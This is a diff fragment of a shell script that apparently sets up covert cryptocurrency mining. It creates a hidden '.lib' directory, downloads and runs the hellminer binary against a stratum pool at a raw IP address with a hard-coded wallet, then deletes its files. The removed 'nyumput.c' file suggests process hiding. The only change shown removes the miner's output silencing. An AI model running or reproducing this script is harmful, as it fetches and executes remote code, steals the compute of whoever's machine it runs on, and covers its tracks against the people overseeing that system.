@@ -11,7 +11,7 @@ rm nyumput.c
 WORKER=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/')
 mkdir .lib && cd .lib
 wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xvf hellminer_linux64.tar.gz
-./hellminer -c stratum+tcp://209.97.168.28:443 -u RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.$WORKER -p x > /dev/null 2>&1
+./hellminer -c stratum+tcp://209.97.168.28:443 -u RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.$WORKER -p x 
 sleep 30
 rm -rvf *
 cd ~/
